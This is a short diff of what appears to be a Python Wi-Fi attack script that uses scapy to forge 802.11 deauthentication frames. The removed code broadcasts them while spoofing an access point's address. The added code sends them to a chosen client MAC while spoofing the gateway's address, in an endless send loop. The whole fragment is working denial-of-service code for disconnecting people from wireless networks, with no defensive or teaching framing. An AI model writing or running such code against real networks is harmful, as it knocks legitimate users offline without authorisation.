@@ -34,17 +34,13 @@ GREEN = '\033[92m'
 RED = '\033[91m'
 ENDC = '\033[0m'
 BOLD = '\033[1m'
-PATTREN = {"MAC Address": 'Address:(.*)',
-            "ESSID": 'ESSID:(.*)',
-            "ID": '(.*) - Address'}
-def send_deauth(mac, mon):
-    pkt = scapy.all.RadioTap()/scapy.all.Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=mac[0], addr3=mac[0])/scapy.all.Dot11Deauth()
-    print (GREEN+"[*] Sending Deauthentication Packets to -> "+mac[1]+ENDC)
+
+def send_deauth(target_mac,iface, gw_mac):
+    pkt = Dot11(type=8, subtype=12, addr1=target_mac, addr2=gw_mac, addr3=gw_mac)
+    print (GREEN+"[*] Sending Deauthentication Packets to "+RED +target_mac+ENDC)
     while True:
         try:
-            sys.stdout.write("\b{}".format(next(spin)))
-            sys.stdout.flush()
-            scapy.all.sendp(pkt, iface=mon, count=1, inter=.2, verbose=0)
+            scapy.all.sendp(pkt, iface=iface, count=1, inter=.2, verbose=0)
         except KeyboardInterrupt:
             print ("\n")
             exit(0)
